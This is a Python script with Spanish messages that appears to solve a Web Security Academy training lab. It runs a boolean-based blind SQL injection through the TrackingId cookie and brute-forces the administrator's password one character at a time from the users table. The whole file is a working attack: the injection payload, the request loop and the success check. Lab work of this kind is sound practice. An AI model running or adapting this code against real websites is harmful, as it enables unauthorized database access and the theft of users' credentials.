#!/usr/bin/python3 

from pwn import * 
import requests, signal, time, pdb, sys, string

def def_handler(sig, frame):
    print("\n\n[!] Saliendo...\n")
    sys.exit(1)


# Ctrl + c
signal.signal(signal.SIGINT, def_handler)

main_url="https://0add006403a236e0c0f91f900081009f.web-security-academy.net"
characters= string.ascii_lowercase + string.digits

def makeRequests():
    password=""
    
    p1 = log.progress("Fuerza bruta")
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    p2 = log.progress("Password")

    for position in range(1, 21):
        for character in characters:
            cookies = {
                    "TrackingId": "9BTAXg9CWgueJePm' and (select substring(password,%d,1) from users where username='administrator')='%s" % (position, character),
                    "session": "0aUi1LOYfRGtiE7K3VGivY8x3r8f548j"
            }
            p1.status(cookies['TrackingId'])

            r = requests.get(main_url, cookies=cookies)

            if "Welcome back!" in r.text:
                password += character
                p2.status(password)
                break
    
    
if __name__ == "__main__":
    makeRequests()

